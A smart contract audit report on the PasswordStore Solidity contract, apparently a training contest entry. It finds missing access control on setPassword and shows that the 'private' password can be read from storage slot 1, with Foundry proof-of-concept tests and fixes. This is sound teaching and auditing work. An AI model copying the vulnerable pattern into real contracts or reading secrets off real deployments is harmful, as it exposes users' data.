# PasswordStore — Security Review Report (First Flight Submission)

- **Target contract:** `src/PasswordStore.sol`
- **Compiler:** Solidity `0.8.18`
- **Audit framework:** Foundry (with PoC tests)
- **Tools / methodology:** Manual review + Foundry proof-of-concept tests

---

## Summary

| ID | Title | Severity |
|----|-------|----------|
| [H-1](#h-1-setpassword-has-no-access-control-anyone-can-change-the-password) | `setPassword` has no access control — anyone can change the password | **High** |
| [H-2](#h-2-the-private-variable-s_password-is-readable-on-chain-and-is-not-secret) | The `private` variable `s_password` is readable on-chain and is not secret | **High** |

| Severity | Count |
|----------|-------|
| High | 2 |
| Medium | 0 |
| Low | 0 |
| **Total** | **2** |

---

## H-1: `setPassword` has no access control — anyone can change the password

### Severity
**High** (Impact: High / Likelihood: High)

### Location
[`src/PasswordStore.sol:41-44`](src/PasswordStore.sol#L41-L44)

```solidity
function setPassword(string memory newPassword) external {
    s_password = newPassword;
    emit SetNetPassword();
}
```

### Description
`PasswordStore` is intended to let **only the owner** set a new password, as stated in the NatSpec (`@notice This function allows only the owner to set a new password.`). However, `setPassword` performs no check that `msg.sender` is the owner, and it is declared `external`, so anyone can call it. As a result, any arbitrary third party can overwrite the owner's password.

### Impact
- The core access-control assumption of the contract is completely broken.
- An attacker can overwrite the owner's password at any time with an arbitrary value.
- The integrity of the stored data is not guaranteed at all.

### Proof of Concept
The following test is included in `test/PasswordStore.t.sol`. The fact that it **passes proves the bug exists**.

```solidity
function test_anyone_can_set_password() public {
    // Impersonate a random third party that is not the owner
    address randomAttacker = address(1);
    vm.startPrank(randomAttacker);

    // The attacker sets the password without authorization
    string memory attackerPassword = "hackedByAttacker";
    passwordStore.setPassword(attackerPassword);
    vm.stopPrank();

    // When the real owner reads it, the value has been overwritten by the attacker
    vm.startPrank(owner);
    string memory actualPassword = passwordStore.getPassword();
    assertEq(actualPassword, attackerPassword); // passes => proof of the bug
    vm.stopPrank();
}
```

Result:

```
[PASS] test_anyone_can_set_password() (gas: 25440)
```

### Recommended Mitigation
Add a check that the caller is the owner inside `setPassword`.

```solidity
function setPassword(string memory newPassword) external {
    if (msg.sender != s_owner) {
        revert PasswordStore__NotOwner();
    }
    s_password = newPassword;
    emit SetNetPassword();
}
```

Alternatively, integrate OpenZeppelin's `Ownable` contract and apply the `onlyOwner` modifier to `setPassword`.

---

## H-2: The `private` variable `s_password` is readable on-chain and is not secret

### Severity
**High** (Impact: High / Likelihood: High)

### Location
[`src/PasswordStore.sol:20`](src/PasswordStore.sol#L20)

```solidity
string private s_password;
```

### Description
The contract claims it can store a password that others cannot see (`@notice This contract allows you to store a private password that others won't be able to see.`). However, Solidity's `private` keyword **only restricts access from other contracts/functions** — it does not encrypt or otherwise conceal the data. All storage on the blockchain is publicly readable, so the contents of `s_password` can be retrieved in plaintext by anyone.

`s_password` is the second declared state variable, so it occupies storage **slot 1** (`s_owner` is slot 0). It can be read directly with `eth_getStorageAt` (`vm.load` in Foundry).

### Impact
- The contract's sole purpose — storing a "secret password" — is not achieved.
- Any observer other than the owner can retrieve the stored password in plaintext.

### Proof of Concept
```solidity
function test_password_is_not_really_private() public {
    // The owner stores a password
    vm.startPrank(owner);
    string memory secret = "myTopSecret";
    passwordStore.setPassword(secret);
    vm.stopPrank();

    // s_password is stored in slot 1
    bytes32 data = vm.load(address(passwordStore), bytes32(uint256(1)));

    // A short string is stored as "character data + (length * 2) in the last byte"
    uint256 length = (uint256(data) & 0xff) / 2;
    bytes memory passwordBytes = new bytes(length);
    for (uint256 i = 0; i < length; i++) {
        passwordBytes[i] = data[i];
    }
    string memory leaked = string(passwordBytes);
    console.log("Leaked password:", leaked);

    // Despite being private, the contents can be read
    assertEq(leaked, secret);
}
```

Result:

```
[PASS] test_password_is_not_really_private() (gas: 27960)
Logs:
  Leaked password: myTopSecret
```

The plaintext `myTopSecret` appears in the logs, confirming that the password leaks despite the `private` qualifier.

### Recommended Mitigation
This requires a design-level rethink: do not store secret data on-chain in plaintext.

- Change the design so that confidential information is never stored on-chain.
- If storage is unavoidable, encrypt the data off-chain and store only the ciphertext; never place the decryption key on-chain.
- Communicate to the designer that the very premise of managing a password on-chain (the purpose of this contract) is fundamentally unsound.

---

## Reproduction Steps

```bash
forge test --match-test "test_anyone_can_set_password|test_password_is_not_really_private" -vv
```

Expected output:

```
[PASS] test_anyone_can_set_password()
[PASS] test_password_is_not_really_private()
  Leaked password: myTopSecret
```

Both tests passing demonstrates that the two High-severity findings in this report are proven.
